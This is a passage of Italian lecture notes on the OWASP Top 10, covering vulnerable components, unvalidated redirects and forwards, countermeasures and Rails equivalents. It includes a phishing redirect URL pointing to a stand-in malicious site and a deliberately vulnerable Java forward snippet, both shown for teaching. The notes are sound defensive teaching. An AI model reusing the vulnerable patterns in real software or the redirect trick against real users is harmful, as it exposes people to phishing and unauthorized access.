- questo **allarga il bacino degli attaccanti**: non solo attaccanti mirati, ma anche **attori caotici** (chiunque lanci uno scanner).

**Diffusi**:
- praticamente **ogni applicazione** ha questo problema, perché la maggior parte dei team **non si preoccupa di tenere aggiornati** componenti e librerie;
- in molti casi gli sviluppatori **non conoscono nemmeno tutti i componenti** che usano, figuriamoci le loro versioni. Le **dipendenze dei componenti** (le dipendenze delle dipendenze) peggiorano le cose.

**Impatto tipico**:
- è possibile **tutta la gamma di debolezze**: injection, controllo degli accessi rotto, XSS…;
- l'impatto va da **minimo** alla **compromissione completa dell'host** e dei dati.

### Cosa si può fare?

**Ideale**:
- **controlli automatici periodici** (es. nella *nightly build*) per vedere se le librerie sono **obsolete**;
- ancora meglio, l'automazione segnala anche le **vulnerabilità note**.

**Minimo**:
- **a mano**, controllare periodicamente se le librerie sono obsolete e **aggiornare** quelle che lo sono;
- se qualcuna è obsoleta ma non la si vuole aggiornare, controllare se ci sono **problemi di sicurezza noti** in quelle librerie ("out of data" nella slide è un refuso per *out of date*);
  - se sì, aggiornarle.

**Si potrebbe anche**:
- a mano, controllare periodicamente se qualche libreria ha **vulnerabilità note** in questo momento:
  - consultare **CVE** (*Common Vulnerabilities and Exposures*, il catalogo pubblico delle vulnerabilità) e altri repository;
  - se ce ne sono, aggiornare almeno quelle.

![[LASS-L17-p40.png]]

**Esempio di automazione per Java: il plugin Maven *Versions***. L'output del plugin analizza automaticamente lo stato delle librerie rispetto al repository centrale: una tabella delle dipendenze con, per ciascuna, la versione in uso e le versioni più recenti disponibili. Le annotazioni evidenziano a sinistra le librerie **più obsolete** (*most out of date!*) e a destra i **dettagli** che servono allo sviluppatore (le versioni a cui aggiornare). **Si può eseguire automaticamente OGNI VOLTA che il software viene compilato!**

> [!tip] In Rails
> L'equivalente sono `bundle outdated` (librerie obsolete), **bundler-audit** (confronta il `Gemfile.lock` con un database di vulnerabilità note delle gem) e servizi come Dependabot su GitHub, che aprono automaticamente le pull request di aggiornamento. Anche la versione di Rails e di Ruby va tenuta aggiornata: Rails 6.1 e Ruby 2.7, usati nel corso, non ricevono più patch di sicurezza.

## A10 – Unvalidated Redirects and Forwards

Vedi [[Unvalidated Redirects and Forwards]].

I **redirect** delle web application sono molto comuni:
- e includono spesso **parametri forniti dall'utente** nell'URL di destinazione;
- se non sono validati, l'attaccante può **mandare la vittima su un sito a sua scelta**.

Anche i **forward** (chiamati *Transfer* in .NET) sono comuni:
- inviano **internamente** la richiesta a una nuova pagina **della stessa applicazione**;
- a volte sono i **parametri a definire la pagina di destinazione**;
- se non validati, l'attaccante può usare un forward non validato per **aggirare i controlli di autenticazione o autorizzazione**.

| | Redirect | Forward |
|---|---|---|
| Chi lo esegue | il **browser** (risposta 3xx, nuova richiesta) | il **server**, internamente |
| Destinazione | anche un altro sito | una pagina della stessa applicazione |
| Rischio | phishing, malware | scavalcare i controlli di accesso |

**Impatto tipico**:
- **reindirizzare la vittima** a un sito di phishing o malware;
- la richiesta dell'attaccante viene **inoltrata oltre i controlli di sicurezza**, permettendo l'accesso non autorizzato a funzioni o dati.

### Redirect non validato illustrato

![[LASS-L17-p42.png]]

1. L'attaccante invia l'attacco alla vittima via email o pagina web: un'email che finge di venire dall'**Internal Revenue Service** (il fisco americano): *"Your Unclaimed Tax Refund — Our records show you have an unclaimed federal tax refund. Please click here to initiate your claim."*
2. La vittima clicca il link, che contiene un **parametro non validato**: `http://www.irs.gov/taxrefund/claim.jsp?year=2006&…&dest=www.evilsite.com`. La richiesta va al **sito vulnerabile** (quello vero!), con il sito dell'attaccante come parametro di destinazione.
3. L'applicazione **reindirizza la vittima al sito dell'attaccante**.
4. Il sito malevolo **installa malware** sulla vittima, o la induce a fornire **informazioni private** (phishing).

L'inganno funziona perché il link **inizia davvero con `www.irs.gov`**: la vittima (e i filtri antispam) vedono un dominio fidato.

### Forward non validato illustrato

![[LASS-L17-p43.png]]

1. L'attaccante invia l'attacco a una **pagina vulnerabile a cui ha accesso**. La richiesta contiene un parametro che dice di inoltrarlo a una **pagina privata**.
2. L'applicazione **autorizza la richiesta** (il **filtro** controlla solo la pagina richiesta, a cui l'attaccante ha accesso), che prosegue verso la pagina vulnerabile.
3. La pagina di forward **non valida il parametro** e manda l'attaccante alla pagina non autorizzata, **aggirando il controllo degli accessi**.

Il codice Java della figura:

```java
public void doPost(HttpServletRequest request, HttpServletResponse response) {
  try {
    String target = request.getParameter("dest");
    ...
    request.getRequestDispatcher(target).forward(request, response);
  }
  catch ( ...
```

La destinazione del forward viene presa direttamente dal parametro `dest`. E siccome il forward è interno al server, il filtro di autorizzazione non viene rieseguito: il metodo `sensitiveMethod(...)` della pagina privata ("Do sensitive stuff here") viene eseguito per l'attaccante.

### Contromisure

Ci sono diverse opzioni:
- **evitare** il più possibile redirect e forward;
- se si usano, **non coinvolgere parametri dell'utente** nella definizione dell'URL di destinazione;
- se **bisogna** coinvolgerli, allora:
  - **validare ogni parametro** per assicurarsi che sia valido e autorizzato per l'utente corrente, oppure
  - (**preferibile**) usare una **mappatura lato server** per tradurre la scelta fornita all'utente nella pagina di destinazione effettiva (come la *access reference map* di A4: il parametro è `dest=2`, e il server sa che 2 significa `/profilo`);
- **difesa in profondità**: per i redirect, **validare l'URL di destinazione dopo averlo calcolato**, per assicurarsi che vada su un sito esterno autorizzato;
- **ESAPI può farlo per voi!**

Alcune considerazioni sulla protezione dei **forward**:
- idealmente, si chiama il **controllore degli accessi** per verificare che l'utente sia autorizzato **prima** di fare il forward (con ESAPI è facile);
- con un filtro esterno, come Siteminder, non è molto pratico;
- la seconda soluzione migliore è assicurarsi che **tutti gli utenti che possono accedere alla pagina originale siano autorizzati** ad accedere anche alla pagina di destinazione.

> [!tip] In Rails
> `redirect_to params[:url]` è il classico redirect aperto. Meglio redirigere solo verso route interne (`redirect_to movies_path`) o verificare l'host. Da Rails 7 `redirect_to` verso un host esterno solleva un errore, a meno di passare esplicitamente `allow_other_host: true`. Lo stesso problema riguarda il `redirect_uri` di [[14 - LASS - Autenticazione#Autenticazione con OAuth|OAuth]].

## Riepilogo: come si affrontano questi problemi?

**Sviluppare codice sicuro**:
- seguire le best practice della **OWASP Guide to Building Secure Web Applications** e i **Cheat Sheet** di OWASP;
- usare l'**Application Security Verification Standard** (ASVS) di OWASP come guida a ciò che serve perché un'applicazione sia sicura;
- usare **componenti di sicurezza standard** adatti alla propria organizzazione:
  - usare **ESAPI** di OWASP come base per i propri componenti standard (oggi, per chi usa un framework come Rails, i componenti standard sono quelli del framework stesso).

**Revisionare le applicazioni**:
- far revisionare le applicazioni da un **team di esperti**;
- revisionarle da sé seguendo le linee guida OWASP:
  - **OWASP Code Review Guide**;
  - **OWASP Testing Guide**.

> [!summary] Le dieci categorie in breve
> | # | Categoria | Idea | Difesa principale | In Rails |
> |---|---|---|---|---|
> | A1 | Injection | l'input diventa codice per un interprete | query parametrizzate, white list | `where(campo: valore)`, mai interpolare |
> | A2 | Broken Auth & Session | credenziali o session ID rubati o deboli | TLS, sessioni standard, logout reale | cookie di sessione cifrato, `has_secure_password`, `reset_session` |
> | A3 | XSS | script dell'attaccante eseguito nel browser della vittima | output encoding per contesto, CSP | escaping automatico di ERB |
> | A4 | Insecure Direct Object Ref. | si cambia un ID e si vede un oggetto altrui | controllo di autorizzazione per oggetto, reference map | `current_user.reviews.find(id)` |
> | A5 | Security Misconfiguration | default, patch mancanti, segreti esposti | hardening automatizzato, verifiche | credentials, ambiente production |
> | A6 | Sensitive Data Exposure | dati sensibili in chiaro (a riposo o in transito) | cifratura corretta, TLS, HSTS | `filter_parameters`, `force_ssl` |
> | A7 | Missing Function Level AC | si cambia URL e si accede a funzioni riservate | deny by default a ogni livello | `before_action` |
> | A8 | CSRF | il browser della vittima invia un comando forgiato | token segreto nelle richieste | `protect_from_forgery` |
> | A9 | Known Vulnerable Components | librerie con vulnerabilità note | inventario e aggiornamenti automatici | bundler-audit, Dependabot |
> | A10 | Unvalidated Redirects/Forwards | destinazione scelta dall'attaccante | niente parametri utente, mappatura lato server | `redirect_to` solo verso route interne |
